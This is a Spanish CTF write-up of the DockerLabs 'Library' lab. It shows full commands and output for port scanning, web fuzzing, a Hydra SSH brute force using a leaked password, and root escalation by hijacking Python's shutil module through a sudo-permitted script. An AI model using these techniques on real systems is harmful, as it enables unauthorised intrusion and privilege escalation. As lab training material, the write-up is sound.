---
title: Library
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-05-30
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-library/library_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - http
  - fuzzing_web
  - data_leaks
  - sudo_abuse
  - python_library_hijacking
  - information_gathering
  - web_analysis
  - data_leak_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/library:-$ ping -c 1 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.058 ms
--- 172.17.0.3 ping statistics ---

1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.058/0.058/0.058/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/library:-$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 172.17.0.3
Host: 172.17.0.3 ()     Status: Up
Host: 172.17.0.3 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/library:-$ nmap -sCV -vvv -p22,80 -oN nmap2 172.17.0.3
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9f6fcf7f84dd474514c882354a0b3af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOE+AMUTmmJFie8NgXoV0LWMWmHQU2yXAMVJnPC/JPzRYOstWvVS+YjLNy2mNK2a
KFi/ubqYfwGq5IkKZgXTUEA=
|   256 fd5b01b6d218aea36f26b23c00e512c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKaYjuffpq2p5LshURmRdGCPjM1gO/+OI5UZ4l37IkRF
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 06:38:70:2B:1F:EA (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/library:-$ whatweb 172.17.0.3
http://172.17.0.3 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.3], Title[Apache2 Ubuntu Default Page: It works]
```

---
## Web Analysis

La página principal entrega únicamente la plantilla por defecto de Apache Ubuntu.

![](assets/img/dockerlabs-writeup-library/library1_1.png)

Ejecuto fuzzing sobre la raíz y detecto la presencia del archivo `index.php`.

```terminal
/home/kali/Documents/dockerlabs/library:-$ dirb http://172.17.0.3/
---- Scanning URL: http://172.17.0.3/ ----
+ http://172.17.0.3/index.html (CODE:200|SIZE:10671)
+ http://172.17.0.3/index.php (CODE:200|SIZE:26)
==> DIRECTORY: http://172.17.0.3/javascript/
+ http://172.17.0.3/server-status (CODE:403|SIZE:275)
```

Accedo al recurso y visualizo una cadena de texto.

![](assets/img/dockerlabs-writeup-library/library1_2.png)

---
## Data Leak Exploitation

Utilizo esa cadena como contraseña en un ataque de fuerza bruta.

```terminal
/home/kali/Documents/dockerlabs/library:-$ hydra -L /opt/seclists/Usernames/xato-net-10-million-usernames.txt -p 'JIFGHDS87GYDFIGD' ssh://172.17.0.3 -t 40 -I
[22][ssh] host: 172.17.0.3   login: carlos   password: JIFGHDS87GYDFIGD
```

Consigo credenciales validas para acceder por SSH con el usuario `carlos`.

```terminal
/home/kali/Documents/dockerlabs/library:-$ ssh carlos@172.17.0.3
carlos@172.17.0.3's password: JIFGHDS87GYDFIGD

carlos@a63c3f434005:~$ id
uid=1001(carlos) gid=1001(carlos) groups=1001(carlos)
```

---
## Privilege Escalation

```terminal
carlos@a63c3f434005:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
carlos:x:1001:1001::/home/carlos:/bin/bash
```

Reviso los privilegios `sudo` asignados a `carlos` y descubro que puede ejecutar el script `/opt/script.py` como `root` sin necesidad de autenticación.

```terminal
carlos@a63c3f434005:~$ sudo -l
Matching Defaults entries for carlos on a63c3f434005:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User carlos may run the following commands on a63c3f434005:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

El script contiene una función que importa el módulo `shutil` para realizar una copia de archivo. La operación ocurre sin validación externa, lo cual permite abusar de la importación de módulos de Python.

```terminal
carlos@a63c3f434005:~$ cat /opt/script.py
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

El script contiene una función que importa el módulo `shutil` para realizar una copia de archivo. La operación ocurre sin validación externa, lo cual permite abusar de la importación de módulos de Python.

```terminal
carlos@a63c3f434005:~$ echo -e 'import os\nos.system("/bin/bash")' > /opt/shutil.py
```

Al ejecutar el script con `sudo`, el intérprete carga el módulo malicioso y obtengo acceso como `root`.

```terminal
carlos@a63c3f434005:~$ sudo /usr/bin/python3 /opt/script.py

root@a63c3f434005:/home/carlos# id
uid=0(root) gid=0(root) groups=0(root)
```
